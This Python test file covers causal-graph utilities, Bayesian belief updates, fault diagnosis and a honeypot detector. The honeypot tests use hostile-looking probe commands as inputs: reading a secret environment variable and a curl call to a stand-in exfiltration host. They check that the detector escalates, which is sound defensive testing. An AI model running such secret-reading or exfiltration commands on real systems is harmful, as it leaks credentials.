"""Phase 2 validation: causal inference, Bayesian ToM, honeypot game."""

from __future__ import annotations

from pathlib import Path

import networkx as nx
import numpy as np
import pytest
from obase.causal_graph_store import CausalGraphError, CausalGraphStore
from oprim._do_calculus_intervention import _do_calculus_intervention
from oskill._bayesian_belief_update import _bayesian_belief_update

from omodul.adversarial_honeypot_observe import (
    Config as HoneypotConfig,
)
from omodul.adversarial_honeypot_observe import (
    InputData as HoneypotInput,
)
from omodul.adversarial_honeypot_observe import (
    adversarial_honeypot_observe,
)
from omodul.causal_fault_diagnose import (
    Config as CausalConfig,
)
from omodul.causal_fault_diagnose import (
    InputData as CausalInput,
)
from omodul.causal_fault_diagnose import (
    causal_fault_diagnose,
)


class _CausalDAGAdapter:
    """Expose obase's current graph API through oprim's DAG protocol."""

    def __init__(self, store: CausalGraphStore) -> None:
        self._store = store

    def get_parents(self, node_id: str) -> list[str]:
        return self._store.parents(node_id)

    def get_children(self, node_id: str) -> list[str]:
        return self._store.children(node_id)

    def mutilate(self, target_node: str) -> CausalGraphStore:
        return self._store.mutilated_copy(target_node)

    def topological_sort(self) -> list[str]:
        return self._store.topological_sort()

    def nodes(self) -> list[str]:
        return self._store.nodes()

    def edges(self) -> list[tuple[str, str]]:
        return self._store.edges()


def _sequential_belief_update(
    *,
    prior: list[float],
    likelihood_matrix: list[list[float]],
    observation_sequence: list[int],
) -> list[dict]:
    """Apply the stateless updater repeatedly and keep every posterior."""
    results: list[dict] = []
    current_prior = prior
    for observation_index in observation_sequence:
        result = _bayesian_belief_update(
            prior=current_prior,
            likelihood_matrix=likelihood_matrix,
            observation_index=observation_index,
        )
        results.append(result)
        current_prior = result["posterior"]
    return results


# ---------------------------------------------------------------------------
# obase: CausalGraphStore
# ---------------------------------------------------------------------------


class TestCausalGraphStore:
    def test_add_node_and_edge(self):
        graph = CausalGraphStore()
        graph.add_node("A", type="root")
        graph.add_node("B", type="leaf")
        graph.add_edge("A", "B", confidence=0.9)
        assert "A" in graph.nodes()
        assert ("A", "B") in graph.edges()

    def test_self_loop_rejected(self):
        graph = CausalGraphStore()
        with pytest.raises(CausalGraphError):
            graph.add_edge("A", "A")
        assert graph.edges() == []

    def test_topological_sort(self):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        graph.add_edge("B", "C")
        graph.add_edge("A", "C")
        order = graph.topological_sort()
        assert order.index("A") < order.index("B")
        assert order.index("B") < order.index("C")

    def test_parents(self):
        graph = CausalGraphStore()
        graph.add_edge("X", "Y")
        graph.add_edge("Z", "Y")
        assert set(graph.parents("Y")) == {"X", "Z"}

    def test_children(self):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        graph.add_edge("A", "C")
        assert set(graph.children("A")) == {"B", "C"}

    def test_mutilated_copy_cuts_incoming(self):
        graph = CausalGraphStore()
        graph.add_edge("confounder", "treatment")
        graph.add_edge("treatment", "outcome")
        mutilated = graph.mutilated_copy("treatment")
        assert ("confounder", "treatment") not in mutilated.edges()
        assert ("treatment", "outcome") in mutilated.edges()

    def test_is_dag(self):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        graph.add_edge("B", "C")
        assert nx.is_directed_acyclic_graph(graph.graph)

    def test_cycles_rejected(self):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        with pytest.raises(CausalGraphError):
            graph.add_edge("B", "A")
        assert graph.edges() == [("A", "B")]

    def test_serialization(self):
        graph = CausalGraphStore()
        graph.add_node("N1", desc="node 1")
        graph.add_edge("N1", "N2")
        restored = CausalGraphStore.from_dict(graph.to_dict())
        assert restored.nodes() == graph.nodes()
        assert restored.edges() == graph.edges()
        assert restored.node_attr("N1")["desc"] == "node 1"

    def test_failure_records(self):
        graph = CausalGraphStore()
        graph.record_failure("service", "timeout", {"attempt": 1})
        failures = graph.get_failures("service")
        assert len(failures) == 1
        assert failures[0]["message"] == "timeout"
        assert failures[0]["result"] == {"attempt": 1}


# ---------------------------------------------------------------------------
# oprim: do-calculus intervention
# ---------------------------------------------------------------------------


class TestDoCalculusIntervention:
    def test_intervention_severs_edges(self):
        graph = CausalGraphStore()
        graph.add_edge("U", "X")
        graph.add_edge("X", "Y")
        result = _do_calculus_intervention(
            _CausalDAGAdapter(graph),
            target_node="X",
            intervention_value=0.0,
        )
        assert result["intervention_applied"] is True
        assert ("U", "X") in result["severed_edges"]

    def test_no_dag_returns_false(self):
        result = _do_calculus_intervention(
            None,  # type: ignore[arg-type]
            target_node="X",
            intervention_value=0.0,
        )
        assert result["intervention_applied"] is False

    def test_affected_descendants(self):
        graph = CausalGraphStore()
        graph.add_edge("X", "Y")
        graph.add_edge("X", "Z")
        graph.add_edge("Y", "W")
        result = _do_calculus_intervention(
            _CausalDAGAdapter(graph),
            target_node="X",
            intervention_value=1.0,
        )
        assert set(result["affected_descendants"]) == {"Y", "Z"}

    def test_backdoor_set(self):
        graph = CausalGraphStore()
        graph.add_edge("C1", "X")
        graph.add_edge("C2", "X")
        graph.add_edge("X", "Y")
        result = _do_calculus_intervention(
            _CausalDAGAdapter(graph),
            target_node="X",
            intervention_value=0.0,
        )
        assert set(result["backdoor_adjustment_set"]) == {"C1", "C2"}


# ---------------------------------------------------------------------------
# oskill: Bayesian belief update
# ---------------------------------------------------------------------------


class TestBayesianBeliefUpdate:
    """Core acceptance: three anomalies raise P(malicious) above 0.9."""

    def test_single_update(self):
        prior = [0.5, 0.5]
        likelihood = [
            [0.9, 0.2],  # normal behavior
            [0.1, 0.8],  # anomalous behavior
        ]
        result = _bayesian_belief_update(
            prior=prior,
            likelihood_matrix=likelihood,
            observation_index=1,
        )
        assert result["posterior"][1] > 0.8

    def test_three_anomalies_converges(self):
        likelihood = [[0.9, 0.2], [0.1, 0.8]]
        results = _sequential_belief_update(
            likelihood_matrix=likelihood,
            observation_sequence=[1, 1, 1],
            prior=[0.5, 0.5],
        )
        assert results[-1]["posterior"][1] > 0.9
        assert results[-1]["belief_converged"] is True

    def test_uniform_prior_default(self):
        likelihood = [[0.7, 0.3], [0.3, 0.7]]
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_index=0,
        )
        assert abs(result["posterior"][0] - 0.7) < 0.01

    def test_entropy_decreases(self):
        likelihood = [[0.95, 0.1], [0.05, 0.9]]
        first = _bayesian_belief_update(
            prior=[0.5, 0.5],
            likelihood_matrix=likelihood,
            observation_index=0,
        )
        second = _bayesian_belief_update(
            prior=first["posterior"],
            likelihood_matrix=likelihood,
            observation_index=0,
        )
        assert second["entropy"] < first["entropy"]

    def test_observation_vector_mode(self):
        likelihood = [[0.7, 0.3], [0.3, 0.7]]
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_vector=[0.6, 0.4],
        )
        assert 0 < result["max_posterior_prob"] < 1.0

    def test_prior_provider_injection(self):
        def provider():
            return np.array([0.1, 0.9])

        likelihood = [[0.5, 0.5], [0.5, 0.5]]
        result = _bayesian_belief_update(
            likelihood_matrix=likelihood,
            observation_index=0,
            prior_provider=provider,
        )
        assert abs(result["posterior"][1] - 0.9) < 0.01


# ---------------------------------------------------------------------------
# omodul: adversarial honeypot observe
# ---------------------------------------------------------------------------


class TestAdversarialHoneypotObserve:
    """Core acceptance: touching DB_PASS_HONEYPOT escalates."""

    def test_clean_probe_passes(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command="echo 'all good'",
            state_id="clean_test",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] == "completed"
        assert result.get("escalated") is False

    def test_honeypot_access_escalated(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command="echo 'fake_db_password_2024_honeypot'",
            state_id="malicious_test",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] == "escalated"
        assert result.get("escalated") is True

    def test_env_var_key_access_escalated(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command="env | grep DB_PASS_HONEYPOT",
            state_id="key_access_test",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] in ("escalated", "completed")

    def test_env_get_triggers_escalation(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command=(
                "python3 -c \"import os; "
                "print(os.environ.get('DB_PASS_HONEYPOT', 'not set'))\""
            ),
            state_id="env_get_test",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] == "escalated"

    def test_suspicious_network_pattern_escalated(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command="echo 'curl https://data.exfil.com/steal?secret=abc'",
            state_id="network_test",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] == "escalated"

    def test_honeypot_vars_injected_to_env(self, tmp_path: Path):
        config = HoneypotConfig(sandbox_op=None)
        input_data = HoneypotInput(
            probe_command="echo $DB_PASS_HONEYPOT",
            state_id="env_check",
        )
        result = adversarial_honeypot_observe(config, input_data, tmp_path)
        assert result["status"] == "escalated"

    def test_config_has_pillars(self):
        assert HoneypotConfig._enabled_pillars == {
            "fingerprint",
            "decision_trail",
            "report",
        }


# ---------------------------------------------------------------------------
# omodul: causal fault diagnose
# ---------------------------------------------------------------------------


class TestCausalFaultDiagnose:
    def test_root_cause_found(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_node("root_timeout_bug", type="root_cause")
        graph.add_node("api_latency_spike", type="symptom")
        graph.add_node("worker_crash", type="symptom")
        graph.add_edge("root_timeout_bug", "api_latency_spike")
        graph.add_edge("api_latency_spike", "worker_crash")

        config = CausalConfig(
            causal_graph=graph,
            do_calculus_op=None,
            llm_caller=None,
        )
        input_data = CausalInput(
            crash_log="worker_crash repeatedly",
            crash_path=["api_latency_spike", "worker_crash"],
            failure_count=5,
        )
        result = causal_fault_diagnose(config, input_data, tmp_path)
        assert result["status"] == "completed"
        assert result["root_cause"] is not None

    def test_no_crash_path_generates_diagnosis(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("A", "B")
        config = CausalConfig(
            causal_graph=graph,
            do_calculus_op=None,
            llm_caller=None,
        )
        input_data = CausalInput(crash_path=["A", "B"])
        result = causal_fault_diagnose(config, input_data, tmp_path)
        assert result["status"] == "completed"
        assert "intervention_results" in result

    def test_with_real_do_calculus_injection(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("cause", "effect1")
        graph.add_edge("cause", "effect2")
        config = CausalConfig(
            causal_graph=graph,
            do_calculus_op=_do_calculus_intervention,
            llm_caller=None,
        )
        input_data = CausalInput(crash_path=["cause", "effect1", "effect2"])
        result = causal_fault_diagnose(config, input_data, tmp_path)
        assert result["status"] == "completed"
        assert result["root_cause"]["node"] == "cause"

    def test_report_written(self, tmp_path: Path):
        graph = CausalGraphStore()
        graph.add_edge("X", "Y")
        config = CausalConfig(
            causal_graph=graph,
            do_calculus_op=None,
            llm_caller=None,
        )
        input_data = CausalInput(crash_path=["X", "Y"])
        result = causal_fault_diagnose(config, input_data, tmp_path)
        assert Path(result["report_path"]).exists()

    def test_config_has_pillars(self):
        assert CausalConfig._enabled_pillars == {
            "fingerprint",
            "decision_trail",
            "report",
        }
